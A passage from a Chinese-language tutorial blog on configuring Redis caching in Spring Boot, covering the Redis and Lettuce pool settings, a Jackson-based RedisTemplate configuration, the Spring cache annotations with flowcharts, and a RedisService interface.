<br>    redis:  <br>      host: <span class="hljs-number">192.168</span>.<span class="hljs-number">136.8</span>  <br>      port: <span class="hljs-number">6379</span>  <br>      password:  <br>      database: <span class="hljs-number">0</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">1. database：</span><br><span class="hljs-string">    1. Redis 的数据库编号，默认是 0。</span><br><span class="hljs-string">    2. Redis 默认有 16 个逻辑库，设计初衷是用于区分不同业务，比如库 1 存 Session，库 2 存验证码，避免数据混淆。</span><br><span class="hljs-string">    3. 但在实际生产中，大多数项目只用 DB 0，然后通过 Key 前缀来区分业务，例如：</span><br><span class="hljs-string">        1. user:session:123</span><br><span class="hljs-string">        2. order:lock:456</span><br><span class="hljs-string">        3. sms:code:789</span><br><span class="hljs-string">    4. 原因主要包括：</span><br><span class="hljs-string">        1. 多个库并不是真正隔离，仅是命令作用的划分；</span><br><span class="hljs-string">        2. Redis Cluster 模式只支持 DB 0；</span><br><span class="hljs-string">        3. 很多客户端或中间件默认只能使用 DB 0；</span><br><span class="hljs-string">        4. 多库之间资源共享，比如内存和性能指标不会隔离。</span><br><span class="hljs-string">2. password：</span><br><span class="hljs-string">1. 连接密码，默认为空</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><hr><h5 id="1-2-2-配置类配置"><a href="#1-2-2-配置类配置" class="headerlink" title="1.2.2. 配置类配置"></a>1.2.2. 配置类配置</h5><p>在这个配置类中，我们完成了以下配置：</p><ol><li>&#x3D;&#x3D;启用了缓存功能&#x3D;&#x3D;：<ol><li>支持注解式缓存（如 <code>@Cacheable</code>）</li></ol></li><li>&#x3D;&#x3D;RedisTemplate 的序列化配置&#x3D;&#x3D;：<ol><li>用于使用 ResitTemplate 编程式操作 Redis 时的行为</li><li>所有 Redis key 都以字符串形式存储</li><li>所有 value 通过 Jackson 转成 JSON 格式存储，保证复杂对象安全序列化；</li><li>虽然 Spring Data Redis 有默认行为，但在处理复杂类型时，默认行为可能导致反序列化错误；</li></ol></li><li>&#x3D;&#x3D;注解式缓存行为定制&#x3D;&#x3D;：<ol><li>缓存值同样采用 Jackson JSON 序列化，保持统一；</li><li>默认缓存过期时间设置为 1 天（TTL）；</li><li>Redis key 自动加上前缀，如 <code>mall:user::123</code>，便于分类管理。<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// 用缓存功能</span><br><span class="hljs-meta">@EnableCaching</span><br><span class="hljs-meta">@Configuration</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RedisConfig</span> &#123;<br><br>    <span class="hljs-comment">// Redis 数据库自定义 key 前缀，结果可能为 mall:user::123</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> final <span class="hljs-title class_">String</span> <span class="hljs-variable constant_">REDIS_KEY_DATABASE</span> = <span class="hljs-string">&quot;mall&quot;</span>;<br><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">RedisTemplate</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">Object</span>&gt; <span class="hljs-title function_">redisTemplate</span>(<span class="hljs-params"><span class="hljs-title class_">RedisConnectionFactory</span> redisConnectionFactory</span>) &#123;<br>        <span class="hljs-title class_">RedisSerializer</span>&lt;<span class="hljs-title class_">Object</span>&gt; serializer = <span class="hljs-title function_">redisSerializer</span>();<br>        <span class="hljs-title class_">RedisTemplate</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">Object</span>&gt; redisTemplate = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RedisTemplate</span>&lt;&gt;();<br>        redisTemplate.<span class="hljs-title function_">setConnectionFactory</span>(redisConnectionFactory);<br>        redisTemplate.<span class="hljs-title function_">setKeySerializer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRedisSerializer</span>());<br>        redisTemplate.<span class="hljs-title function_">setValueSerializer</span>(serializer);<br>        redisTemplate.<span class="hljs-title function_">setHashKeySerializer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRedisSerializer</span>());<br>        redisTemplate.<span class="hljs-title function_">setHashValueSerializer</span>(serializer);<br>        redisTemplate.<span class="hljs-title function_">afterPropertiesSet</span>();<br>        <span class="hljs-keyword">return</span> redisTemplate;<br>    &#125;<br><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">RedisSerializer</span>&lt;<span class="hljs-title class_">Object</span>&gt; <span class="hljs-title function_">redisSerializer</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-comment">// 创建 ObjectMapper</span><br>        <span class="hljs-title class_">ObjectMapper</span> objectMapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectMapper</span>();<br>        objectMapper.<span class="hljs-title function_">setVisibility</span>(<span class="hljs-title class_">PropertyAccessor</span>.<span class="hljs-property">ALL</span>, <span class="hljs-title class_">JsonAutoDetect</span>.<span class="hljs-property">Visibility</span>.<span class="hljs-property">ANY</span>);<br>        <span class="hljs-comment">// 必须设置，否则无法将JSON转化为对象，会转化成Map类型</span><br>        objectMapper.<span class="hljs-title function_">activateDefaultTyping</span>(<span class="hljs-title class_">LaissezFaireSubTypeValidator</span>.<span class="hljs-property">instance</span>, <span class="hljs-title class_">ObjectMapper</span>.<span class="hljs-property">DefaultTyping</span>.<span class="hljs-property">NON_FINAL</span>);<br>        <br>        <span class="hljs-comment">// 使用带 ObjectMapper 的构造函数</span><br>        <span class="hljs-title class_">Jackson2JsonRedisSerializer</span>&lt;<span class="hljs-title class_">Object</span>&gt; serializer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Jackson2JsonRedisSerializer</span>&lt;&gt;(objectMapper, <span class="hljs-title class_">Object</span>.<span class="hljs-property">class</span>);<br>        <span class="hljs-keyword">return</span> serializer;<br>    &#125;<br><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">RedisCacheManager</span> <span class="hljs-title function_">redisCacheManager</span>(<span class="hljs-params"><span class="hljs-title class_">RedisConnectionFactory</span> redisConnectionFactory</span>) &#123;<br>        <span class="hljs-title class_">RedisCacheWriter</span> redisCacheWriter = <span class="hljs-title class_">RedisCacheWriter</span>.<span class="hljs-title function_">nonLockingRedisCacheWriter</span>(redisConnectionFactory);<br>        <span class="hljs-comment">// 设置Redis缓存有效期为1天，并使用 REDIS_KEY_DATABASE 作为前缀</span><br>        <span class="hljs-title class_">RedisCacheConfiguration</span> redisCacheConfiguration = <span class="hljs-title class_">RedisCacheConfiguration</span>.<span class="hljs-title function_">defaultCacheConfig</span>()<br>                .<span class="hljs-title function_">serializeValuesWith</span>(<span class="hljs-title class_">RedisSerializationContext</span>.<span class="hljs-property">SerializationPair</span>.<span class="hljs-title function_">fromSerializer</span>(<span class="hljs-title function_">redisSerializer</span>()))<br>                .<span class="hljs-title function_">entryTtl</span>(<span class="hljs-title class_">Duration</span>.<span class="hljs-title function_">ofDays</span>(<span class="hljs-number">1</span>))<br>                .<span class="hljs-title function_">prefixCacheNameWith</span>(<span class="hljs-variable constant_">REDIS_KEY_DATABASE</span> + <span class="hljs-string">&quot;:&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RedisCacheManager</span>(redisCacheWriter, redisCacheConfiguration);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol></li></ol><hr><h5 id="1-2-3-连接池配置"><a href="#1-2-3-连接池配置" class="headerlink" title="1.2.3. 连接池配置"></a>1.2.3. 连接池配置</h5><p>在 Spring Boot 1.5.x 版本中，默认使用 Jedis 客户端。Jedis 采用直连方式，默认一个 Jedis 实例对应一条 TCP 连接（成员变量），当多个线程同时操作同一个 Jedis 实例（即共享 Jedis Bean）会导致线程安全问题，因此通常通过连接池（如 <code>JedisPool</code>）来为每个线程分配独立的连接实例，从而实现线程安全。</p><p>从 Spring Boot 2.x 开始，默认客户端切换为 Lettuce。Lettuce 是一个基于 Netty 的高性能 Redis 客户端，具备良好的可伸缩性与线程安全特性。它允许多个线程共享同一个连接实例，内部通过事件循环机制（Event Loop）串行化请求，既避免线程冲突又能让少量线程处理大量请求。Lettuce 同时支持同步、异步以及响应式编程模型，适用于构建高并发、非阻塞的应用场景。</p><blockquote><p>[!NOTE] 注意事项</p><ol><li>Lettuce 虽然使用 Netty 实现底层通信，但它自己维护一套 NIO 的线程池，其线程池（EventLoopGroup）完全独立于 Tomcat 的线程池。因此，即使使用 Lettuce，也完全可以继续使用 Tomcat 作为 Web 服务容器，不会因此“被迫迁移到 Netty”。</li></ol></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python">spring:  <br>  data:  <br>    redis:  <br>      lettuce:  <br>        pool:  <br>          <span class="hljs-built_in">max</span>-active: <span class="hljs-number">8</span>  <br>          <span class="hljs-built_in">max</span>-idle: <span class="hljs-number">8</span>  <br>          <span class="hljs-built_in">min</span>-idle: <span class="hljs-number">0</span>  <br>          <span class="hljs-built_in">max</span>-wait: -1ms<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">1. max-active：</span><br><span class="hljs-string">1. 连接池最大连接数</span><br><span class="hljs-string">2. max-idle：</span><br><span class="hljs-string">1. 连接池最大空闲连接数</span><br><span class="hljs-string">3. min-idle：</span><br><span class="hljs-string">1. 连接池最小空闲连接数</span><br><span class="hljs-string">4. max-wait：</span><br><span class="hljs-string">1. 连接池最大阻塞等待时间，负值表示没有限制</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><hr><h4 id="1-3-标注相关注解"><a href="#1-3-标注相关注解" class="headerlink" title="1.3. 标注相关注解"></a>1.3. 标注相关注解</h4><h5 id="1-3-1-EnableCaching"><a href="#1-3-1-EnableCaching" class="headerlink" title="1.3.1. @EnableCaching"></a>1.3.1. @EnableCaching</h5><p>在启动类或配置类上添加<code> @EnableCaching</code> 注解，用于启动缓存功能</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-variable">@EnableCaching</span><br><span class="hljs-variable">@SpringBootApplication</span><br>public class MallTinyApplication &#123;<br>    <span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">static</span> <span class="hljs-selector-tag">void</span> <span class="hljs-selector-tag">main</span>(String[] args) &#123;<br>        <span class="hljs-selector-tag">SpringApplication</span><span class="hljs-selector-class">.run</span>(MallTinyApplication.class, args);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h5 id="1-3-2-Cacheable"><a href="#1-3-2-Cacheable" class="headerlink" title="1.3.2. @Cacheable"></a>1.3.2. @Cacheable</h5><p><code>@Cacheable</code> 一般用在查询方法上。如果缓存里有数据，就直接取缓存，不会执行方法；如果缓存没有，就执行方法，并把返回结果放进缓存（有 <code>condition</code>、<code>unless</code> 不算）</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-comment"># 1. 语法结构</span><br><span class="hljs-variable">@Cacheable</span>(<br>    value     = <span class="hljs-string">&quot;user&quot;</span>,<br>    key       = <span class="hljs-string">&quot;#id&quot;</span>,<br>    condition = <span class="hljs-string">&quot;#id &gt; 100&quot;</span>,<br>    <span class="hljs-keyword">unless</span>    = <span class="hljs-string">&quot;#result == null&quot;</span><br>)<br><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">1. value:</span><br><span class="hljs-string">1. 缓存的命名空间（必填）</span><br><span class="hljs-string">2. 和 key 一起组成 Redis 中的键，如：user::123，可以简单理解为是前缀</span><br><span class="hljs-string">3. 如果我们在配置类中配置了前缀，最后可能的结果为：mall:user::123</span><br><span class="hljs-string">2. key：</span><br><span class="hljs-string">1. 设置在命名空间中的缓存 key 值，可以使用 SpEL 表达式定义；</span><br><span class="hljs-string">3. condition：</span><br><span class="hljs-string">1. 条件符合则缓存。</span><br><span class="hljs-string">4. unless：</span><br><span class="hljs-string">1. 条件符合则不缓存；</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"># 2. 示例一</span><br><span class="hljs-string">@Cacheable(</span><br><span class="hljs-string">    value     = &quot;</span>user<span class="hljs-string">&quot;,</span><br><span class="hljs-string">    key       = &quot;</span><span class="hljs-comment">#id&quot;,</span><br>    condition = <span class="hljs-string">&quot;#id &gt; 100&quot;</span>,<br>    <span class="hljs-keyword">unless</span>    = <span class="hljs-string">&quot;#result == null&quot;</span><br>)<br><span class="hljs-keyword">public</span> <span class="hljs-title class_">User</span> getUserById(<span class="hljs-title class_">Long</span> id) &#123;<br>    <span class="hljs-title class_">System</span>.out.println(<span class="hljs-string">&quot;方法执行，id = &quot;</span> + id);<br>    <span class="hljs-keyword">return</span> userRepository.findById(id).orElse(null);<br>&#125;<br></code></pre></td></tr></table></figure><p>注意：虽然正常情况下是按照上述流程执行的，但一旦使用了 <code>condition</code> 或 <code>unless</code>，这个顺序会被打乱。<br>&#x3D;&#x3D;1.只有 condition 的情况&#x3D;&#x3D;</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs css">flowchart LR<br>  <span class="hljs-selector-tag">A</span><span class="hljs-selector-attr">[开始调用]</span> --&gt; <span class="hljs-selector-tag">B</span>&#123;是否符合 condition&#125;<br>  <span class="hljs-selector-tag">B</span> -- 否 --&gt; C<span class="hljs-selector-attr">[执行方法（跳过读写缓存）]</span><br>  C --&gt; D<span class="hljs-selector-attr">[返回结果]</span><br>  <span class="hljs-selector-tag">B</span> -- 是 --&gt; E&#123;是否缓存命中&#125;<br>  E -- 是 --&gt; F<span class="hljs-selector-attr">[返回缓存结果]</span><br>  E -- 否 --&gt; <span class="hljs-selector-tag">G</span><span class="hljs-selector-attr">[执行方法]</span><br>  <span class="hljs-selector-tag">G</span> --&gt; H<span class="hljs-selector-attr">[写入缓存]</span><br>  H --&gt; <span class="hljs-selector-tag">I</span><span class="hljs-selector-attr">[返回结果]</span><br></code></pre></td></tr></table></figure><p><img src="/image-20250517211323498.png"></p><p>&#x3D;&#x3D;2.只有 unless 的情况&#x3D;&#x3D;</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs css">flowchart LR<br>  <span class="hljs-selector-tag">A</span><span class="hljs-selector-attr">[开始调用]</span> --&gt; <span class="hljs-selector-tag">B</span>&#123;是否缓存命中&#125;<br>  <span class="hljs-selector-tag">B</span> -- 是 --&gt; C<span class="hljs-selector-attr">[返回缓存结果]</span><br>  <span class="hljs-selector-tag">B</span> -- 否 --&gt; D<span class="hljs-selector-attr">[执行方法]</span><br>  D --&gt; E&#123;是否符合 unless&#125;<br>  E -- 是 --&gt; F<span class="hljs-selector-attr">[返回结果（不写缓存）]</span><br>  E -- 否 --&gt; <span class="hljs-selector-tag">G</span><span class="hljs-selector-attr">[写入缓存]</span><br>  <span class="hljs-selector-tag">G</span> --&gt; H<span class="hljs-selector-attr">[返回结果]</span><br></code></pre></td></tr></table></figure><p><img src="/image-20250517211409902.png"></p><p>&#x3D;&#x3D;3.conditon 和 unless 都有的情况&#x3D;&#x3D;</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">flowchart LR</span><br>  <span class="hljs-comment">A</span><span class="hljs-title">[</span><span class="hljs-comment">开始调用</span><span class="hljs-title">]</span> <span class="hljs-literal">--</span>&gt; <span class="hljs-comment">B&#123;是否符合 condition&#125;</span><br>  <span class="hljs-comment">B</span> <span class="hljs-literal">--</span> <span class="hljs-comment">否</span> <span class="hljs-literal">--</span>&gt; <span class="hljs-comment">C</span><span class="hljs-title">[</span><span class="hljs-comment">执行方法（跳过读写缓存）</span><span class="hljs-title">]</span><br>  <span class="hljs-comment">C</span> <span class="hljs-literal">--</span>&gt; <span class="hljs-comment">D</span><span class="hljs-title">[</span><span class="hljs-comment">返回结果</span><span class="hljs-title">]</span><br>  <span class="hljs-comment">B</span> <span class="hljs-literal">--</span> <span class="hljs-comment">是</span> <span class="hljs-literal">--</span>&gt; <span class="hljs-comment">E&#123;是否缓存命中&#125;</span><br>  <span class="hljs-comment">E</span> <span class="hljs-literal">--</span> <span class="hljs-comment">是</span> <span class="hljs-literal">--</span>&gt; <span class="hljs-comment">F</span><span class="hljs-title">[</span><span class="hljs-comment">返回缓存结果</span><span class="hljs-title">]</span><br>  <span class="hljs-comment">E</span> <span class="hljs-literal">--</span> <span class="hljs-comment">否</span> <span class="hljs-literal">--</span>&gt; <span class="hljs-comment">G</span><span class="hljs-title">[</span><span class="hljs-comment">执行方法</span><span class="hljs-title">]</span><br>  <span class="hljs-comment">G</span> <span class="hljs-literal">--</span>&gt; <span class="hljs-comment">H&#123;是否符合 unless&#125;</span><br>  <span class="hljs-comment">H</span> <span class="hljs-literal">--</span> <span class="hljs-comment">是</span> <span class="hljs-literal">--</span>&gt; <span class="hljs-comment">I</span><span class="hljs-title">[</span><span class="hljs-comment">返回结果</span><span class="hljs-title">]</span><br>  <span class="hljs-comment">H</span> <span class="hljs-literal">--</span> <span class="hljs-comment">否</span> <span class="hljs-literal">--</span>&gt; <span class="hljs-comment">J</span><span class="hljs-title">[</span><span class="hljs-comment">写入缓存</span><span class="hljs-title">]</span><br>  <span class="hljs-comment">J</span> <span class="hljs-literal">--</span>&gt; <span class="hljs-comment">I</span><br></code></pre></td></tr></table></figure><p><img src="/image-20250517210734445.png"></p><hr><h5 id="1-3-3-CachePut"><a href="#1-3-3-CachePut" class="headerlink" title="1.3.3. @CachePut"></a>1.3.3. @CachePut</h5><p><code>@CachePut</code> 一般用在新增方法上，每次执行时都会把返回结果存入缓存（有 <code>condition</code>、<code>unless</code> 不算），使用方法和 <code>@Cacheable</code> 一样</p><hr><h5 id="1-3-4-CacheEvict"><a href="#1-3-4-CacheEvict" class="headerlink" title="1.3.4. @CacheEvict"></a>1.3.4. @CacheEvict</h5><p><code>@CacheEvict</code> 一般用在更新或删除方法上，每次执行时会清空缓存（有 <code>condition</code> 不算），使用方法和 <code>@Cacheable</code> 类似，不过，该注解没有 <code>unless</code> 属性，只有 <code>value</code>、<code>key</code> 和 <code>condition</code> 三个属性。并且 <code>condition</code> 的判断方式相对简单，只要条件满足就执行清空缓存操作，否则不清空。</p><hr><h3 id="2-业务处理"><a href="#2-业务处理" class="headerlink" title="2. 业务处理"></a>2. 业务处理</h3><h4 id="2-1-自由操作-Redis"><a href="#2-1-自由操作-Redis" class="headerlink" title="2.1. 自由操作 Redis"></a>2.1. 自由操作 Redis</h4><h5 id="2-1-1-自由操作-Redis-概述"><a href="#2-1-1-自由操作-Redis-概述" class="headerlink" title="2.1.1. 自由操作 Redis 概述"></a>2.1.1. 自由操作 Redis 概述</h5><p>在缓存场景下，我们更常使用注解，因为它几乎是“无脑式”的操作方式，无需关心底层细节即可轻松完成缓存管理。但当遇到复杂场景时，比如不仅是缓存，还涉及消息队列、排行榜、实时统计等功能，注解就显得力不从心了，这时候就必须大量使用 <code>RedisTemplate</code>，因为注解无法满足这些复杂操作需求。因为其存在以下问题：</p><ol><li>无法为不同缓存项设置各自独立的过期时间，只能使用我们在配置类中配置的TTL（一天）</li><li>只能缓存方法的返回值，无法缓存中间计算结果。</li><li>虽然可以将缓存值以 JSON 形式存储，但这实际上是以字符串形式存在 Redis 中，而 Redis 本身支持多种丰富的数据结构，如 List、Set、ZSet、Hash，我们当然需要利用这些优势。</li><li>无法进行细粒度操作，无法直接修改 JSON 内部某个字段，只能整体读取、修改后再整体写回，效率低且容易出错，同时频繁序列化与反序列化带来较大开销，尤其是数据量大时更明显。</li></ol><p>因此，面对这些复杂需求时，我们需要使用 <code>RedisTemplate</code>，手动进行底层操作，来实现更灵活、高效的缓存管理。</p><hr><h5 id="2-1-2-封装-RedisService"><a href="#2-1-2-封装-RedisService" class="headerlink" title="2.1.2. 封装 RedisService"></a>2.1.2. 封装 RedisService</h5><h6 id="2-1-2-1-RedisService-接口"><a href="#2-1-2-1-RedisService-接口" class="headerlink" title="2.1.2.1. RedisService 接口"></a>2.1.2.1. RedisService 接口</h6><p><code>RedisTemplate</code> 是功能强大的底层工具类，但用起来其实挺“麻烦”的，我们可以封装成 RedisService，该接口中定义了大多数常用操作方法，业务暂时用不到 ZSet，就没有加</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><code class="hljs scss">public interface RedisService &#123;<br><br>    <span class="hljs-comment">// 保存属性</span><br>    void <span class="hljs-built_in">set</span>(String key, Object value, long time);<br><br>    <span class="hljs-comment">// 保存属性</span><br>    void <span class="hljs-built_in">set</span>(String key, Object value);<br><br>    <span class="hljs-comment">// 获取属性</span><br>    <span class="hljs-selector-tag">Object</span> <span class="hljs-built_in">get</span>(String key);<br><br>    <span class="hljs-comment">// 删除属性</span><br>    Boolean <span class="hljs-selector-tag">del</span>(String key);<br><br>    <span class="hljs-comment">// 批量删除属性</span><br>    Long <span class="hljs-selector-tag">del</span>(List&lt;String&gt; keys);<br><br>    <span class="hljs-comment">// 设置过期时间</span><br>    Boolean <span class="hljs-built_in">expire</span>(String key, long time);<br><br>    <span class="hljs-comment">// 获取过期时间</span><br>    Long <span class="hljs-built_in">getExpire</span>(String key);<br><br>    <span class="hljs-comment">// 判断是否有该属性</span><br>    Boolean <span class="hljs-built_in">hasKey</span>(String key);<br><br>    <span class="hljs-comment">// 按 delta 递增</span><br>    Long <span class="hljs-built_in">incr</span>(String key, long delta);<br><br>    <span class="hljs-comment">// 按 delta 递减</span><br>    Long <span class="hljs-built_in">decr</span>(String key, long delta);<br><br>    <span class="hljs-comment">// 获取 Hash 结构中的属性</span><br>    <span class="hljs-selector-tag">Object</span> <span class="hljs-built_in">hGet</span>(String key, String hashKey);<br><br>    <span class="hljs-comment">// 向 Hash 结构中放入一个属性</span><br>    Boolean <span class="hljs-built_in">hSet</span>(String key, String hashKey, Object value, long time);<br><br>    <span class="hljs-comment">// 向 Hash 结构中放入一个属性</span><br>    void <span class="hljs-built_in">hSet</span>(String key, String hashKey, Object value);<br><br>    <span class="hljs-comment">// 直接获取整个 Hash 结构</span><br>    Map&lt;<span class="hljs-selector-tag">Object</span>, <span class="hljs-selector-tag">Object</span>&gt; <span class="hljs-built_in">hGetAll</span>(String key);<br><br>    <span class="hljs-comment">// 直接设置整个 Hash 结构</span><br>    Boolean <span class="hljs-built_in">hSetAll</span>(String key, Map&lt;String, Object&gt; map, long time);<br><br>    <span class="hljs-comment">// 直接设置整个 Hash 结构</span><br>    void <span class="hljs-built_in">hSetAll</span>(String key, Map&lt;String, Object&gt; map);<br><br>    <span class="hljs-comment">// 删除 Hash 结构中的属性</span><br>    void <span class="hljs-built_in">hDel</span>(String key, Object... hashKey);<br><br>    <span class="hljs-comment">// 判断 Hash 结构中是否有该属性</span><br>    Boolean <span class="hljs-built_in">hHasKey</span>(String key, String hashKey);<br><br>    <span class="hljs-comment">// Hash 结构中属性递增</span><br>    Long <span class="hljs-built_in">hIncr</span>(String key, String hashKey, Long delta);<br><br>    <span class="hljs-comment">// Hash 结构中属性递减</span><br>    Long <span class="hljs-built_in">hDecr</span>(String key, String hashKey, Long delta);<br><br>    <span class="hljs-comment">// 获取 Set 结构</span><br>    Set&lt;<span class="hljs-selector-tag">Object</span>&gt; <span class="hljs-built_in">sMembers</span>(String key);<br><br>    <span class="hljs-comment">// 向 Set 结构中添加属性</span><br>    Long <span class="hljs-built_in">sAdd</span>(String key, Object... values);<br><br>    <span class="hljs-comment">// 向 Set 结构中添加属性</span><br>    Long <span class="hljs-built_in">sAdd</span>(String key, long time, Object... values);<br><br>    <span class="hljs-comment">// 是否为 Set 中的属性</span><br>    Boolean <span class="hljs-built_in">sIsMember</span>(String key, Object value);<br><br>    <span class="hljs-comment">// 获取 Set 结构的长度</span><br>    Long <span class="hljs-built_in">sSize</span>(String key);<br><br>    <span class="hljs-comment">// 删除 Set 结构中的属性</span><br>    Long <span class="hljs-built_in">sRemove</span>(String key, Object... values);<br><br>    <span class="hljs-comment">// 获取 List 结构中的属性</span><br>    List&lt;<span class="hljs-selector-tag">Object</span>&gt; <span class="hljs-built_in">lRange</span>(String key, long start, long end);<br><br>    <span class="hljs-comment">// 获取 List 结构的长度</span><br>    Long <span class="hljs-built_in">lSize</span>(String key);<br><br>    <span class="hljs-comment">// 根据索引获取 List 中的属性</span><br>    <span 